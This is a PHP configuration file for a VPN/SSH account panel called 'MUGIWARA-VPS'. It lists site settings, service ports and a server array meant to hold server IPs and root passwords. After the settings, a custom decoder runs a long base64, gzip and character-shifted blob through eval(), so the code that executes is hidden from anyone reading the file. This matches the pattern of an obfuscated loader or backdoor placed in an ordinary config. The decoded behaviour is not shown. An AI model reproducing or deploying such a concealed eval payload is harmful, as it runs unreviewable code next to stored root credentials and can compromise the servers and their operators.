<?php
/* Site Data */
$site_name        = "MUGIWARA-VPS VPS";
$site_description = "Premium VPN/SSH/SSL Accounts Fast And Reliable Servers";
$site_template    = "flatly"; // (flatly, darkly, sketchy, lumen, materia)
$site_ip_address = "serverip"; // set site ip
$site_paypal = "https://www.paypal.com"; // set site paypal donate link
$site_contact = "https://t.me/LUFFYxSENPAI"; // set site contact us link
$daily_limit_user = "90"; // set daily limit


/* Server Data */
/* Format: Server_Name, IP_Address, Root_Pass, Account_Validity */
/* Example: 1=>array(1=>"LUFFYxSENPAI Server 1","123.456.789","LUFFYxSENPAI","5"), */

$server_lists_array=array(
			1=>array(1=>"servername","serverip","serverpass","5"),
	);			


/* Service Variables */
$port_ssh= '22'; 		                // SSH Ports
$port_dropbear= '109, 143'; 	         	// Dropbear Ports
$port_ssl= '442';                               // SSL Ports
$port_squid= '3128, 8080';        	       	// Squid Ports
$ovpn_client= ''.$hosts.'/LUFFYxSENPAI.ovpn';        // OpenVPN Client Config

function trthe($Bajm)
{ 
$Bajm=gzinflate(base64_decode($Bajm));
 for($i=0;$i<strlen($Bajm);$i++)
 {
$Bajm[$i] = chr(ord($Bajm[$i])-1);
 }
 return $Bajm;
 }eval(trthe("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"));?>

